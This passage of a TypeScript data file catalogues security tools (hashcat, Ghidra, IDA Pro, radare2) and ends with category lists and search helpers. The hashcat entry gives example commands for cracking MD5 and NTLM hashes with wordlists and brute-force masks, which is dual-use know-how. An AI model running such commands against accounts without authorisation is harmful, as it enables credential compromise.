    description: 'Hash cracking tool',
    usage: 'Password hash recovery',
    commands: [
      'hashcat -m 0 hash.txt wordlist.txt',
      'hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d?d',
      'hashcat --example-hashes | grep NTLM'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Advanced',
    tags: ['cryptography', 'hash-cracking', 'passwords'],
    website: 'https://hashcat.net/hashcat/'
  },

  // Reverse Engineering
  {
    id: 'ghidra',
    name: 'Ghidra',
    category: 'Reverse Engineering',
    subcategory: 'Binary Analysis',
    description: 'Software reverse engineering framework',
    usage: 'Binary analysis, decompilation, reverse engineering',
    commands: [
      '# Start Ghidra',
      'ghidraRun',
      '# Open binary for analysis'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Advanced',
    tags: ['reverse-engineering', 'binary-analysis', 'decompilation'],
    website: 'https://ghidra-sre.org/'
  },
  {
    id: 'ida-pro',
    name: 'IDA Pro',
    category: 'Reverse Engineering',
    subcategory: 'Binary Analysis',
    description: 'Advanced disassembler and debugger',
    usage: 'Binary analysis, malware analysis, reverse engineering',
    commands: [
      '# Start IDA Pro',
      'ida64 binary.exe',
      '# Open binary for analysis'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Advanced',
    tags: ['reverse-engineering', 'disassembler', 'malware-analysis'],
    website: 'https://www.hex-rays.com/products/ida-pro/'
  },
  {
    id: 'radare2',
    name: 'Radare2',
    category: 'Reverse Engineering',
    subcategory: 'Binary Analysis',
    description: 'Open-source reverse engineering framework',
    usage: 'Binary analysis, disassembly, debugging',
    commands: [
      'radare2 binary',
      'aa',
      'pdf',
      'afl'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Advanced',
    tags: ['reverse-engineering', 'open-source', 'disassembler'],
    website: 'https://www.radare.org/'
  }
];

export const toolCategories = [
  'Network Scanning',
  'Web Application Testing', 
  'Password Cracking',
  'Vulnerability Scanning',
  'Wireless Testing',
  'Digital Forensics',
  'Exploitation',
  'OSINT',
  'Post-Exploitation',
  'Network Analysis',
  'Mobile Security',
  'Social Engineering',
  'Cryptography',
  'Reverse Engineering'
];

export const getToolsByCategory = (category: string) => {
  return cyberSecurityTools.filter(tool => tool.category === category);
};

export const searchTools = (query: string) => {
  const lowercaseQuery = query.toLowerCase();
  return cyberSecurityTools.filter(tool => 
    tool.name.toLowerCase().includes(lowercaseQuery) ||
    tool.description.toLowerCase().includes(lowercaseQuery) ||
    tool.tags.some(tag => tag.toLowerCase().includes(lowercaseQuery))
  );
};
